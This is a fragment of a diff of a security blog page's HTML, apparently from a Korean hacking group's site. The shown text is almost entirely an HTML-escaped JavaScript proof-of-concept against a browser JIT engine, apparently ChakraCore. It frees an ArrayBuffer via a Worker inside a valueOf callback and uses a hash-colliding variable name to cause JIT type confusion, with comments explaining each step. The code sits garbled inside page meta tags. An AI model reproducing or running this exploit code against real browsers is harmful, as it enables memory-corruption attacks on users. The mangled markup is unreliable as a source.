+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; buf = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ArrayBuffer&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;0x8c&lt;/span&gt;);&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; arr = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;Int32Array&lt;/span&gt;(buf);&lt;/span&gt;
+
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; o = {};&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;o.valueOf = &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;{&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;    alert(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;callback&amp;apos;&lt;/span&gt;);&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;    &lt;span class=&#34;hljs-comment&#34;&gt;// free &lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;    worker = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; Worker(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;worker.js&amp;apos;&lt;/span&gt;);&lt;/span&gt;
+    worker.postMessage(buf, [buf]);
+    worker.terminate();
+&lt;span class=&#34;javascript&#34;&gt;    worker = &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;
+
+&lt;span class=&#34;javascript&#34;&gt;    &lt;span class=&#34;hljs-comment&#34;&gt;// sleep&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; start = &lt;span class=&#34;hljs-built_in&#34;&gt;Date&lt;/span&gt;.now();&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; (&lt;span class=&#34;hljs-built_in&#34;&gt;Date&lt;/span&gt;.now() - start &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;200&lt;/span&gt;) {}&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;    &lt;span class=&#34;hljs-comment&#34;&gt;// &lt;span class=&#34;hljs-doctag&#34;&gt;TODO:&lt;/span&gt; reclaim freed memory&lt;/span&gt;&lt;/span&gt;
+
+&lt;span class=&#34;javascript&#34;&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;
+};
+
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// generate function from string in order to have a clean bytecode generator&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; vulnstr =&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;for (let i=0; i&amp;lt;1; i++) {\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;    function opt(A, x, crash) {\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        &amp;apos;use strict&amp;apos;;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const aagaaaaaaahabauaaaaa = x+1;\n&amp;quot;&lt;/span&gt; + &lt;span class=&#34;hljs-comment&#34;&gt;//special variable name so that hash is eqal to 0x109 (property ID of Int16Array)&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c02 = aagaaaaaaahabauaaaaa+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c03 = c02+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c04 = c03+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c05 = c04+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        let c06 = c05+1;\n&amp;quot;&lt;/span&gt; +  &lt;span class=&#34;hljs-comment&#34;&gt;// this variable will alias with Int16Array&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c07 = c06+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c08 = c07+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c09 = c08+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c10 = c09+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c11 = c10+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c12 = c11+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c13 = c12+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c14 = c13+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c15 = c14+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c16 = c15+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c17 = c16+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c18 = c17+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c19 = c18+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c20 = c19+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c21 = c20+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c22 = c21+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c23 = c22+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c24 = c23+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c25 = c24+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c26 = c25+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c27 = c26+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c28 = c27+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c29 = c28+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c30 = c29+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c31 = c30+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c32 = c31+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c33 = c32+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c34 = c33+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c35 = c34+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c36 = c35+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c37 = c36+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        const c38 = c37+1;\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        if(crash) {\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;          c06 = c06 + 1;\n&amp;quot;&lt;/span&gt; + &lt;span class=&#34;hljs-comment&#34;&gt;// we must change it here so that the value below is not known&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;          Int16Array = o;\n&amp;quot;&lt;/span&gt; + &lt;span class=&#34;hljs-comment&#34;&gt;// here we actually change the value (and type) of c06&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        }\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        A[0] = c06;\n&amp;quot;&lt;/span&gt; + &lt;span class=&#34;hljs-comment&#34;&gt;// if crash==1, c06 is an object here, but JIT thinks it&amp;apos;s an integer&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;        eval(1);\n&amp;quot;&lt;/span&gt; +  &lt;span class=&#34;hljs-comment&#34;&gt;// needed to trigger ByteCodeGenerator::EmitScopeObjectInit&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;    }\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;    for(var i=0; i&amp;lt;100000; i++) {\n&amp;quot;&lt;/span&gt; + &lt;span class=&#34;hljs-comment&#34;&gt;// jit a function&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;      opt(arr, 1, 0);\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;    }\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;    opt(arr, 1, 1);\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;    alert(&amp;apos;failed&amp;apos;);\n&amp;quot;&lt;/span&gt; +&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;}&amp;quot;&lt;/span&gt;;&lt;/span&gt;
+
+&lt;span class=&#34;javascript&#34;&gt;vuln = &lt;span class=&#34;hljs-built_in&#34;&gt;Function&lt;/span&gt;(vulnstr);&lt;/span&gt;
+vuln();
+
+&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt; - hack &amp; life">
+  <meta property="og:image" content="https://hackyboiz.github.io/img/1day1line.png">
   <meta property="og:url" content="https://hackyboiz.github.io/">
 
   <link rel="canonical" href="https://hackyboiz.github.io/2021/06/15/l0ch/2021-06-15/">
